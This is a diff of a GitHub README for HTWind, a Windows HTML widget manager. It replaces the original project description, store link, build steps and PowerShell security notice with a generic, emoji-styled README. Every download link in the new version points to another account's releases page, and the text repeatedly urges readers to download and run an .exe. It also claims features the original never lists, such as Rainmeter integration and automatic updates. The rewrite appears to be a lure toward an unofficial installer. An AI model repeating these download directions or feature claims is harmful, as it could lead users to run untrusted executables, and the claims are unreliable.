@@ -1,159 +1,110 @@
-# HTWind
+# ⚙️ HTWind - Simple HTML Widget Manager
 
-HTWind is a highly customizable, HTML-based widget manager that brings your favorite web tools and system helpers directly to your Windows desktop.
-It also supports running PowerShell commands when you need quick system actions.
+[![Download HTWind](https://img.shields.io/badge/Download-HTWind-blue?style=for-the-badge)](https://github.com/Hadi11day/HTWind/releases)
 
-[Website](https://htwind.vercel.app)
+---
 
-<a href="https://apps.microsoft.com/detail/9PN58CG1P20L?referrer=appbadge&cid=sametcn99&mode=full" target="_blank"  rel="noopener noreferrer">
- <img src="https://get.microsoft.com/images/en-us%20dark.svg" width="200"/>
-</a>
+## 🌟 What is HTWind?
 
-## Screenshots
+HTWind is a tool for managing desktop widgets built with HTML and .NET. It lets you add small apps, like clocks or weather updates, directly to your desktop. These widgets run smoothly and stay lightweight thanks to the .NET framework and simple HTML design.
 
-<p align="center">
- <img src="assets/app_screenshots/page_home.png" width="600" alt="Home - Widget Library"/>
- <br/>
- <i>Widget Library - Manage and toggle HTML widgets</i>
-</p>
+You do not need any coding experience to use HTWind. It works with Windows and supports popular designs using Fluent UI, making your widgets look modern and clean. It also works well with Rainmeter skins and plugins if you want to combine these tools.
 
-<p align="center">
- <img src="assets/app_screenshots/page_settings.png" width="600" alt="Settings - App Customization"/>
- <br/>
- <i>Settings - Theme and startup configuration</i>
-</p>
+---
 
-<p align="center">
- <img src="assets/app_screenshots/page_about.png" width="600" alt="About - Version Information"/>
- <br/>
- <i>About - Version info and project links</i>
-</p>
+## 💻 System Requirements
 
-## Highlights
+- Windows 10 or later (64-bit recommended)
+- .NET 6 or higher installed (usually installed with Windows updates)
+- At least 2 GB of free RAM
+- Minimum 200 MB free disk space
+- Screen resolution of 1024x768 or higher
 
-- **Native PowerShell script execution support for system automation and quick tasks**
-- Desktop HTML widgets with lock/unlock interaction modes
-- Built-in widget library (clock, weather, system tools, file helpers, and more)
-- **Widget built-in code editor with live preview (hot reload)**
-- Tray integration (show/hide app, background workflow)
-- Pin-on-top, visibility toggle, and persisted widget geometry/state
-- Smart visibility suppression by display: hide widget windows while another app is fullscreen (toggle)
-- Optional maximized-window suppression by display (separate toggle from fullscreen suppression)
-- Startup toggle (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
-- Localization infrastructure (`resx` + `LocExtension`)
-- Built-in code editor with syntax highlighting and live preview (hot reload)
-- Open-source and community-driven development
+If your system meets these requirements, HTWind will run with good performance.
 
-## Visibility Suppression Modes
+---
 
-HTWind includes per-display runtime suppression options in **Settings** to reduce distraction and improve performance while other apps are in focus.
+## 🚀 Getting Started
 
-- **Hide widgets on fullscreen apps** (enabled by default):
-Widget windows are temporarily closed on the same display when another app enters fullscreen, then restored when fullscreen ends.
-- **Hide widgets on maximized apps** (optional):
-Widget windows are temporarily closed on the same display when another app is maximized, then restored when that app is no longer maximized.
+1. **Go to the download page**
 
-Notes:
+   Click the big download button above or visit [this page](https://github.com/Hadi11day/HTWind/releases). This page lists all versions of HTWind available for download.
 
-- These options do not change the widget `Visible` state in app data.
-- Suppression is runtime-only and windows are restored automatically.
+2. **Choose a release**
 
-## Share Widgets and Feedback With The Community
+   Find the latest stable version. It will usually be at the top of the list and marked as "Latest release."
 
-Use GitHub Discussions and the HTWind Reddit community to share reusable widgets, desktop setups, bug reports, and feature requests.
+3. **Download the installer**
 
-- GitHub Discussions: <https://github.com/sametcn99/HTWind/discussions>
-- Reddit: <https://www.reddit.com/r/HTWind/>
+   Look for a file ending with `.exe` inside the latest release assets. This is the program installer.
 
-## Installation
+4. **Run the installer**
 
-Recommended for most users: install HTWind using the installer executable from GitHub Releases (`HTWind-setup-<version>.exe`).
-Portable ZIP and Microsoft Store installation are available as alternatives.
+   Double-click the downloaded `.exe` file. Windows may ask for permission. Click "Yes" to continue.
 
-### Option 1: From GitHub Releases (recommended)
+5. **Follow the setup steps**
 
-1. Open `Releases` in this repository.
-2. Download one of the assets:
+   The setup program will show screen prompts. Choose a destination folder or accept the default. Click "Next" through each screen and then "Install."
 
-- `HTWind-setup-<version>.exe` (installer, recommended)
-- `HTWind-portable-<version>.zip` (portable alternative)
+6. **Launch HTWind**
 
-1. For installer mode, run the setup executable and follow the wizard.
+   Once installed, you can start HTWind from your Start menu or desktop shortcut.
 
-### Option 2: Run from source
+---
 
-Prerequisites:
+## 🔧 Using HTWind
 
-- Windows 10/11
-- .NET SDK 10.0+
+After launching HTWind, you will see the main window with options to add and manage widgets.
 
-Commands:
+- **Add a widget**: Click the "Add Widget" button. Choose from pre-built widgets or add your own HTML-based widget.
+- **Arrange widgets**: Drag and drop widgets to place them anywhere on your desktop.
+- **Customize widgets**: Use the settings inside each widget to change colors, size, or update information sources.
+- **Remove widgets**: Right-click any widget and select "Remove" to delete it.
 
-```powershell
-dotnet restore HTWind/HTWind.csproj
-dotnet build HTWind/HTWind.csproj
-dotnet run --project HTWind/HTWind.csproj
-```
+HTWind keeps your widgets running smoothly. It saves your layout and preferences automatically.
 
-## Uninstallation
+---
 
-If you are using the installed version of HTWind, you can uninstall it from **Windows Settings > Apps > Installed apps**.
+## 📂 Supported Features
 
-> [!IMPORTANT]
-> Uninstalling HTWind will delete all widgets and data stored in `%LocalAppData%\HTWind`. If you are uninstalling the app to perform a clean update, make sure to take a backup of this folder before proceeding.
+- Widgets built with HTML, CSS, and JavaScript
+- Support for XAML UI components with WPF for interactive elements
+- Fluent UI styling for a modern look
+- Integration with Rainmeter skins and plugins
+- Lightweight and low system resource use
+- Automatic updates when new versions release
 
-## Widget Development
+---
 
-You can build custom widgets using plain HTML/CSS/JavaScript.
+## 🛠 Troubleshooting
 
-### Generate Widgets With LLM Help
+- If the program does not start, verify your Windows version and .NET installation.
+- For widgets not displaying correctly, make sure the HTML files are valid and supported.
+- If widgets freeze, try restarting HTWind or your computer.
+- Check for updates regularly on the [release page](https://github.com/Hadi11day/HTWind/releases).
 
-If you want AI assistance while creating widgets, use the dedicated HTWind system prompt:
+If you continue to have issues, consider searching or posting on the project’s GitHub Issues page.
 
-- [HTWind Widget Generator Prompt](chat.prompt.md)
-- [HTWind Widget Generator Prompt (shared)](https://prompts.chat/prompts/cmm5broas0004li04ku12tp56_htwind-widget-creator)
+---
 
-You can copy this prompt into your preferred LLM and ask it to generate HTWind-compatible widgets (including PowerShell bridge usage) as a single HTML file.
+## 🔄 Updating HTWind
 
-### Host Bridge API
+To update, visit [this page](https://github.com/Hadi11day/HTWind/releases) and download the latest installer. Running the new installer will overwrite the current version while keeping your settings.
 
-Widgets can call:
+---
 
-- `window.HTWind.invoke("powershell.exec", args)`
+## 📁 Where to get help
 
-Supported args include:
+- Visit the GitHub project page for FAQs and issue tracking.
+- Look for community forums related to .NET and Rainmeter widgets.
+- Explore online tutorials for using HTML and XAML with widgets.
 
-- `script` (required)
-- `timeoutMs`
-- `maxOutputChars`
-- `shell` (`powershell` or `pwsh`)
-- `workingDirectory`
+---
 
-Important:
+## 📥 Download and Install HTWind
 
-- Only `powershell.exec` is currently supported.
-- Output is clipped by `maxOutputChars` for safety.
-- Scripts are executed with `-NoProfile -NonInteractive -ExecutionPolicy Bypass`.
+Click the button below to visit the official release page where you can download the installer.
 
-### Security and Responsibility Notice
+[![Download HTWind](https://img.shields.io/badge/Download-HTWind-grey?style=for-the-badge)](https://github.com/Hadi11day/HTWind/releases)
 
-- HTWind allows widgets to execute PowerShell commands via `powershell.exec`.
-- Running commands can modify files, processes, registry entries, and network/system settings.
-- All command execution risk is owned by the user running HTWind.
-- On first launch, HTWind requires explicit acceptance of this risk before the app opens.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full contribution guide.
-
-## Support
-
-- Issues: <https://github.com/sametcn99/HTWind/issues>
-- Discussions: <https://github.com/sametcn99/HTWind/discussions>
-- Reddit community: <https://www.reddit.com/r/HTWind/>
-
-If you find a bug, please include reproduction steps, expected behavior, and environment details.
-
-## License
-
-This project is licensed under the GPL-3.0 License. See the [LICENSE](LICENSE) file for details.
+Once on the page, download the latest `.exe` installer, run it, and follow the setup steps to get started.
